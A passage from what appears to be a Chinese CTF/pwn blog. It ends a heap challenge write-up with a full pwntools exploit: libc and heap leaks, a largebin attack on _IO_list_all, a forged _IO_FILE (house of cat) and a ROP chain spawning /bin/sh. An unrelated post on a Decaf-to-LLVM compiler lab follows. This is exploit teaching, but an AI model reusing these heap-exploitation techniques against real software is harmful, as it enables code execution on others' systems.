class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>利用程序提供的修改函数可以很轻易地修改 large chunk+0x18，方便我们进行 largebin attack：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Which Employee you want to increase the salary? &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line"><span class="keyword">if</span> ( index &lt;= <span class="number">0xF</span> &amp;&amp; chunk_list[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Salary: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;chunk_list[index]-&gt;Salary);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Sorry Not Allowed!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后打 IO，通过 house of cat 就可以 get shell</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./company1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;company.chal.crewc.tf&#x27;</span>,<span class="string">&#x27;17001&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* 0x401708\n&quot;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,name=<span class="string">&quot;1&quot;</span>,position=<span class="string">&quot;HR&quot;</span>,salary=<span class="number">0</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span>(size)==<span class="built_in">int</span>):</span><br><span class="line">        sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;Size: &quot;</span>,size)</span><br><span class="line">    sa(<span class="string">&quot;Name:&quot;</span>,name)</span><br><span class="line">    sa(<span class="string">&quot;Position:&quot;</span>,position)</span><br><span class="line">    sla(<span class="string">&quot;Salary:&quot;</span>,<span class="built_in">str</span>(salary))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,index2,data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;you are? &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;feedback? &quot;</span>,<span class="built_in">str</span>(index2))</span><br><span class="line">    sa(<span class="string">&quot;Feedback&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;see? &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">salary</span>(<span class="params">index,sala</span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&quot;salary?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;Salary: &quot;</span>,<span class="built_in">str</span>(sala))</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">sla(<span class="string">&quot;name? &quot;</span>,name)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x550</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x550</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x550</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x570</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x530</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">&quot;you are? &quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">sla(<span class="string">&quot;feedback? &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">&quot;Feedback (&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;)&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1f6c98</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">io_list_all = libc_base + <span class="number">0x1f7680</span></span><br><span class="line">success(<span class="string">&quot;io_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x530</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x540</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x540</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">&quot;you are? &quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">sla(<span class="string">&quot;feedback? &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">&quot;Feedback (&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;)&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x1268</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x560</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x530</span>)</span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">salary(<span class="number">6</span>,io_list_all-<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x550</span>)</span><br><span class="line"></span><br><span class="line">libc_system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">61</span></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x12c0</span> - <span class="number">0x10</span></span><br><span class="line">payload_addr = heap_base + <span class="number">0x858</span></span><br><span class="line">flag_addr = heap_base</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_IO_FILE =  &quot;/bin/sh\x00&quot;         #_flags=rdi</span></span><br><span class="line"><span class="comment">#fake_IO_FILE += p64(0)*5</span></span><br><span class="line"><span class="comment">#fake_IO_FILE += p64(1)+p64(2) # rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE  = p64(<span class="number">2</span>)</span><br><span class="line">fake_IO_FILE += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(setcontext)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x58</span>-<span class="number">0x38</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>-<span class="number">0x38</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(flag_addr)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x90</span>-<span class="number">0x38</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xb0</span>-<span class="number">0x38</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>-<span class="number">0x38</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x530</span>)</span><br><span class="line">salary(<span class="number">6</span>,heap_base+<span class="number">0x12b0</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x540</span>,name=<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0</span>)*<span class="number">2</span>,position=p64(<span class="number">0</span>)+p64(<span class="number">1</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">12</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">syscall_ret = <span class="number">0x000000000010b3c9</span> + libc_base</span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000000240e5</span> + libc_base</span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000002573e</span> + libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000026302</span> + libc_base</span><br><span class="line">pop_rax_ret = <span class="number">0x0000000000040143</span> + libc_base</span><br><span class="line"></span><br><span class="line">payload  = p64(payload_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(fake_io_addr+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">11</span>,payload)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">cmd(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/13/CMPT379%E7%BC%96%E8%AF%91%E5%99%A8Lab3%EF%BC%9Adecafexpr/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/07/13/CMPT379%E7%BC%96%E8%AF%91%E5%99%A8Lab3%EF%BC%9Adecafexpr/" class="post-title-link" itemprop="url">CMPT379编译器Lab3：decafexpr</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-07-13 00:10:47 / Modified: 00:12:17" itemprop="dateCreated datePublished" datetime="2023-07-13T00:10:47+08:00">2023-07-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>57k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>51 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>decafexpr</strong></p>
<p>本作业的目标是为变量编写一个代码生成器，用于处理 Decaf 编程语言的简单表达式和方法</p>
<p>输出将在 LLVM 程序集中，该程序集被编译为x86程序集，然后使用 LLVM 工具 <code>llvm-run</code> 编译为二进制文件（工具 <code>llvm-run</code> 一定要有执行权限）</p>
<p>第一步是为编译器编写符号表，Decaf 的结构和代码生成提示在 Decaf 规范中给出：<a target="_blank" rel="noopener" href="http://anoopsarkar.github.io/compilers-class/decafspec.html">Decaf Programming Language Specification</a></p>
<p>在开始此实验之前，建议先完成 LLVM 的练习：<a target="_blank" rel="noopener" href="http://anoopsarkar.github.io/compilers-class/llvm-practice.html">SFU Compilers class: LLVM Practice (anoopsarkar.github.io)</a> （这里介绍了一些 llvm api 的使用方式）</p>
<p><strong>实验描述</strong></p>
<p>本实验有两个步骤：</p>
<ul>
<li>实现可以跟踪变量和方法的符号表 </li>
<li>表达式的代码生成</li>
</ul>
<p>符号表是从标识符到任何信息的映射，需要编译器自动生成</p>
<p>符号表很容易用哈希表或映射实现，例如：cpp stl 的符号表的声明</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> map&lt;string, descriptor* &gt; symbol_table;</span><br></pre></td></tr></table></figure>
<p>其中描述符是包含有用信息的结构或类</p>
<p>在 Decaf 中允许隐藏一个变量声明（在作用域内声明一个变量，但在实际使用之前不对其进行初始化或赋值），这意味着块中标识符的新定义将导致新的描述符与标识符相关联，但一旦块终止必须恢复标识符的先前描述符</p>
<p>实现此本地作用域概念的一种简单方法是指定每个块可以在列表中创建新的符号表：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> list&lt;symbol_table &gt; symbol_table_list;</span><br><span class="line">symbol_table_list symtbl;</span><br></pre></td></tr></table></figure>
<p>如果一个变量的局部定义隐藏了同一变量名称的另一个定义，我们只需扫描从最近的一个开始的符号表列表，就可以获取该变量最近定义的描述符：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">descriptor* <span class="title">access_symtbl</span><span class="params">(string ident)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> i : symtbl) &#123;</span><br><span class="line">        <span class="keyword">auto</span> find_ident = i.<span class="built_in">find</span>(ident);</span><br><span class="line">        <span class="keyword">if</span> (find_ident != i.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> find_ident-&gt;second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为以下 Decaf 片段提供代码生成器，其中包括：</p>
<ul>
<li>算术和布尔表达式</li>
<li>函数调用</li>
<li>函数定义（包括递归函数）</li>
<li>外部函数的声明（所有外部函数都在 <code>decaf-stdlib.c</code> 中定义）</li>
</ul>
<p>LLVM 程序集和工具链输出将转储到目录 <code>llvm</code> 中，应检查输出以调试编译器，请务必遵守以下要求：</p>
<ul>
<li>如果程序成功解析输入 <code>exit(EXIT_SUCCESS)</code>，则应使用 退出程序</li>
<li>如果您的程序在输入的无咖啡因程序中发现错误，则应使用 <code>exit(EXIT_FAILURE)</code></li>
<li>您必须通过调用 <code>TheModule-&gt;print(errs(),nullptr)</code> 来转储 LLVM 程序集，其中模块的类型为 <code>llvm::Module*</code></li>
</ul>
<p>可以使用如下命令对程序进行打分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 zipout.py -r decafexpr</span><br><span class="line">python3 check.py</span><br></pre></td></tr></table></figure>
<p><strong>实验步骤</strong></p>
<p>首先需要把上一个实验的 <code>decafast.y decafast.lex decafast.cc</code> 放入本实验的 answer 目录，然后修改文件名称：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv decafast.lex decafexpr.lex</span><br><span class="line">mv decafast.y decafexpr.y  </span><br><span class="line">mv decafast.cc decafexpr.cc </span><br></pre></td></tr></table></figure>
<ul>
<li>修改 <code>decafexpr.lex decafexpr.y decafexpr.cc</code> 中的头文件引用</li>
<li>将 <code>default.y</code> 中有关 LLVM 的代码拷贝到 <code>decafexpr.y</code> 中</li>
<li>将 <code>default.cc</code> 中有关 LLVM 的代码拷贝到 <code>decafexpr.cc</code> 中</li>
</ul>
<p>本实验的目标就是将 decaf 代码转化为 llvm ir 代码，并且需要判断程序的语义是否错误，然后用 llvm 工具将 llvm ir 转化为二进制文件</p>
<p>先看一个简单的样例：对于类型提升的处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> func <span class="title">print_int</span><span class="params">(<span class="keyword">int</span>)</span> <span class="keyword">void</span></span>;</span><br><span class="line">package Test &#123;</span><br><span class="line">    <span class="function">func <span class="title">main</span><span class="params">()</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var x <span class="keyword">int</span>;</span><br><span class="line">        print_int(<span class="literal">true</span> &amp;&amp; <span class="literal">true</span>);</span><br><span class="line">        print_int(<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>);</span><br><span class="line">        print_int(<span class="literal">false</span> &amp;&amp; <span class="literal">true</span>);</span><br><span class="line">        print_int(<span class="literal">false</span> &amp;&amp; <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;Test&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;DecafExpr&quot;</span></span><br><span class="line"></span><br><span class="line">declare <span class="keyword">void</span> @print_int(i32)</span><br><span class="line"></span><br><span class="line">define i32 @main() &#123;</span><br><span class="line">entry:</span><br><span class="line">  %x = alloca i32</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 <span class="number">1</span>)</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 <span class="number">0</span>)</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 <span class="number">0</span>)</span><br><span class="line">  call <span class="keyword">void</span> @print_int(i32 <span class="number">0</span>)</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里的实际传参类型和该函数定义的传参类型不同</li>
</ul>
<p>编译修改好的实验初始文件，尝试将该样例作为输入，输出的结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;Test&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;Test&quot;</span></span><br><span class="line"></span><br><span class="line">define i32 @main() &#123;</span><br><span class="line">entry:</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在的目标就是用 llvm api 去识别 decaf 的语法分析树，将其转化为 llvm ir</p>
<p>核心步骤就是在上一个实验的基础上进行修改，在合适的位置为其添加 llvm api，并在上一个实验的类中添加对应的 llvm 类指针和 <code>Codegen</code> 函数</p>
<ul>
<li>本实验采用从下往上分析法，和 llvm api 需要的执行顺序不同</li>
<li>因此只能把 llvm 相关操作写入 <code>Codegen</code>，当从下往上的分析结束时，就从上往下调用 <code>Codegen</code> 来构建 llvm ir</li>
</ul>
<p>接下来的实验目标就是为各个类补充 llvm api 指针和 <code>Codegen</code> 函数，我会依照几个实验案例来展示一些我认为比较棘手的问题（包括遇到的问题和解决思路）</p>
